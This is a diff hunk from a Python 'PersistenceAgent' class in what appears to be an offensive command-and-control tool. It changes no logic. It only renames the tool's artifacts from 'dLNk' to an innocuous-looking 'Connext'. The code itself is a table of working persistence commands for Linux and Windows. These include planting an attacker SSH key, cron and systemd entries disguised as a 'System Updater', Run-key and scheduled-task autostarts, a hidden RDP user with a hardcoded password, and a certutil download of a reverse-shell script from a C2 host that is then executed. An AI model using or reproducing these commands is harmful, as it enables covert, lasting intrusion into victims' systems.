@@ -189,16 +189,16 @@ class PersistenceAgent(BaseAgent):
             # Linux
             "cronjob": {"cmd": f'(crontab -l 2>/dev/null; echo "@reboot {payload}") | crontab -', "root_req": True, "os": "linux"},
             "ssh_key": {"cmd": f'mkdir -p ~/.ssh && echo "{self._get_attacker_ssh_public_key()}" >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys', "root_req": False, "os": "linux"},
-            "systemd": {"cmd": f"echo '[Unit]\\nDescription=dLNk System Updater\\n[Service]\\nExecStart={payload}\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target' | tee /etc/systemd/system/dlnk.service && systemctl enable dlnk.service && systemctl start dlnk.service", "root_req": True, "os": "linux"},
+            "systemd": {"cmd": f"echo '[Unit]\\nDescription=Connext System Updater\\n[Service]\\nExecStart={payload}\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target' | tee /etc/systemd/system/connext.service && systemctl enable connext.service && systemctl start connext.service", "root_req": True, "os": "linux"},
             "bashrc": {"cmd": f"echo '{payload} &' >> ~/.bashrc", "root_req": False, "os": "linux"},
             "profile": {"cmd": f"echo '{payload} &' >> ~/.profile", "root_req": False, "os": "linux"},
 
             # Windows
-            "registry_run": {"cmd": f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v dLNkUpdater /t REG_SZ /d "{payload}" /f', "root_req": False, "os": "windows"},
-            "scheduled_task": {"cmd": f'schtasks /create /sc onlogon /tn "dLNkSystemUpdate" /tr "{payload}" /rl HIGHEST /f', "root_req": True, "os": "windows"},
-            "startup_folder": {"cmd": f'echo "{payload}" > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dlnk.bat"', "root_req": False, "os": "windows"},
+            "registry_run": {"cmd": f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ConnextUpdater /t REG_SZ /d "{payload}" /f', "root_req": False, "os": "windows"},
+            "scheduled_task": {"cmd": f'schtasks /create /sc onlogon /tn "ConnextSystemUpdate" /tr "{payload}" /rl HIGHEST /f', "root_req": True, "os": "windows"},
+            "startup_folder": {"cmd": f'echo "{payload}" > "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\connext.bat"', "root_req": False, "os": "windows"},
             "certutil_download": {"cmd": f'certutil.exe -urlcache -split -f http://{settings.C2_HOST}:{settings.TOOL_SERVER_PORT}/lolbas_rev.ps1 C:\\Users\\Public\\rev.ps1 && powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\rev.ps1', "root_req": False, "os": "windows"},
-            "new_user_rdp": {"cmd": f'net user dlnk_temp Pa$w0rd! /add && net localgroup "Remote Desktop Users" dlnk_temp /add', "root_req": True, "os": "windows"}
+            "new_user_rdp": {"cmd": f'net user connext_temp Pa$w0rd! /add && net localgroup "Remote Desktop Users" connext_temp /add', "root_req": True, "os": "windows"}
         }
 
         technique = techniques.get(persistence_type)
